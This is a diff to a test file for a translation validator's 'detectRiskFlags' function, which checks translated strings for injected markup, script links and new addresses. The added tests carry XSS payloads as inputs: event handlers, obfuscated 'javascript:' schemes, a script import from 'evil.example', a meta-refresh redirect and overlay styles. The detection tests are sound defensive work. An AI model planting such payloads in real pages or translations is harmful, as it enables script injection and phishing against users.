@@ -36,7 +36,7 @@ describe('validateWrite', () => {
       'Invalid locale string parameter.',
     ],
     [
-      { locale: 'en', key: 'a b', value: 'x' },
+      { locale: 'en', key: 'a$b', value: 'x' },
       400,
       'INVALID_KEY_FORMAT',
       'Invalid key path. Must be 1-200 characters containing alphanumeric, dots, underscores, or hyphens.',
@@ -286,6 +286,152 @@ describe('detectRiskFlags', () => {
         '<b>a</b><i>b</i> https://a.example https://b.example javascript:1 data:text/html \u202E\u202D'
       )
     ).toEqual(['markup', 'javascript-url', 'new-url', 'bidi-control']));
+
+  describe('payloads that keep the reference tags', () => {
+    const REF = 'Read our <a href="/terms">terms</a>.';
+
+    it('flags an event handler added to a tag the reference has', () =>
+      expect(
+        detectRiskFlags(
+          REF,
+          `Lisez nos <a href="/terms" onmouseover="import('//evil.example/x.js')">conditions</a>.`
+        )
+      ).toContain('markup'));
+
+    it('flags a style attribute added to a tag the reference has', () =>
+      expect(
+        detectRiskFlags(
+          REF,
+          'Lisez nos <a href="/terms" style="position:fixed;inset:0">conditions</a>.'
+        )
+      ).toEqual(['markup']));
+
+    it('flags a changed link target and a protocol-relative address', () =>
+      expect(
+        detectRiskFlags(REF, 'Lisez nos <a href="//evil.example/terms">conditions</a>.')
+      ).toEqual(['markup', 'new-url']));
+
+    it('flags an entity-encoded script scheme', () =>
+      expect(
+        detectRiskFlags(REF, 'Lisez nos <a href="java&#115;cript:alert(1)">conditions</a>.')
+      ).toEqual(['markup', 'javascript-url']));
+
+    it('flags hex, named-entity and tab-split script schemes', () => {
+      expect(detectRiskFlags('Go', 'j&#x61;vascript&colon;alert(1)')).toContain('javascript-url');
+      expect(detectRiskFlags('Go', 'java\tscript:alert(1)')).toContain('javascript-url');
+      expect(detectRiskFlags('Go', 'java&Tab;script:alert(1)')).toContain('javascript-url');
+    });
+
+    it('flags a protocol-relative address in plain text', () =>
+      expect(detectRiskFlags('Read', 'Lisez //evil.example/login')).toEqual(['new-url']));
+
+    it('does not flag the same tags with the same attributes in another order or quoting', () => {
+      expect(detectRiskFlags(REF, 'Lisez nos <a href="/terms">conditions</a>.')).toEqual([]);
+      expect(
+        detectRiskFlags(
+          '<a href="/terms" class="link">terms</a>',
+          "<A class='link' HREF='/terms'>conditions</A>"
+        )
+      ).toEqual([]);
+    });
+
+    it('does not flag a translated title or alt text', () =>
+      expect(
+        detectRiskFlags(
+          '<abbr title="World Health Organization">WHO</abbr>',
+          '<abbr title="Organisation mondiale de la santé">OMS</abbr>'
+        )
+      ).toEqual([]));
+
+    it('does not treat a double slash in prose as an address', () =>
+      expect(detectRiskFlags('a / b', 'a // b')).toEqual([]));
+
+    // A browser reads a quoted attribute value to its closing quote, `<` and `>` included.
+    it('flags an attribute added after a quoted value that holds < or >', () => {
+      expect(
+        detectRiskFlags(REF, '<a href="/terms" title="<" onmouseover="alert(1)">terms</a>')
+      ).toEqual(['markup']);
+      expect(
+        detectRiskFlags(REF, '<a href="/terms" title="<" style="position:fixed;inset:0">terms</a>')
+      ).toEqual(['markup']);
+      expect(
+        detectRiskFlags(
+          '<a href="/terms" title="Terms">terms</a>',
+          `<a href="/terms" title='>' onmouseover="alert(1)">terms</a>`
+        )
+      ).toEqual(['markup']);
+    });
+
+    it('does not flag a translated quoted value that holds < or >', () =>
+      expect(
+        detectRiskFlags(
+          '<a href="/terms" title="Terms > Privacy">terms</a>',
+          '<a href="/terms" title="Conditions > Confidentialité">conditions</a>'
+        )
+      ).toEqual([]));
+
+    it('still reads a tag whose unquoted value holds an apostrophe', () =>
+      expect(detectRiskFlags('Hi', "Hi <img src=x onerror=alert(1) alt=it's>")).toEqual([
+        'markup',
+      ]));
+
+    it('flags a changed srcdoc, content or ping value', () => {
+      expect(
+        detectRiskFlags(
+          'Hi <iframe srcdoc="hello"></iframe>',
+          'Salut <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'
+        )
+      ).toEqual(['markup']);
+      expect(
+        detectRiskFlags(
+          '<meta http-equiv="refresh" content="5">',
+          '<meta http-equiv="refresh" content="0;url=https://evil.example">'
+        )
+      ).toContain('markup');
+      expect(
+        detectRiskFlags('<a href="/t" ping="/a">t</a>', '<a href="/t" ping="/b">t</a>')
+      ).toEqual(['markup']);
+    });
+  });
+
+  describe('addresses after a line break or a tab', () => {
+    it('flags a new address on its own line or after a tab', () => {
+      expect(
+        detectRiskFlags('Contact us for help.', 'Contact us\nhttps://evil.example/help')
+      ).toEqual(['new-url']);
+      expect(detectRiskFlags('Contact us for help.', 'Contact us\r\nhttps://evil.example')).toEqual(
+        ['new-url']
+      );
+      expect(detectRiskFlags('Contact us for help.', 'Contact us\twww.evil.example')).toEqual([
+        'new-url',
+      ]);
+    });
+
+    it('flags a script link on its own line', () =>
+      expect(detectRiskFlags('Mail us', 'Mail us\njavascript:alert(1)')).toEqual([
+        'javascript-url',
+      ]));
+
+    it('does not glue the next line to an address', () =>
+      expect(
+        detectRiskFlags(
+          'Read more at https://acme.com/docs\nThanks!',
+          'Plus sur https://acme.com/docs\nMerci !'
+        )
+      ).toEqual([]));
+
+    it('reads a long run of unclosed quotes quickly', () => {
+      const started = Date.now();
+      detectRiskFlags('Hi', '<a x="'.repeat(2000));
+      detectRiskFlags('Hi', '<a =" '.repeat(2000));
+      expect(Date.now() - started).toBeLessThan(1000);
+    });
+
+    it('does not flag an address the reference has on its own line too', () =>
+      expect(
+        detectRiskFlags('Contact us\nhttps://acme.com/help', 'اتصل بنا\nhttps://acme.com/help')
+      ).toEqual([]));
+  });
 
   it('has a message for every flag', () =>
     expect(Object.keys(RISK_FLAG_MESSAGES).sort()).toEqual([
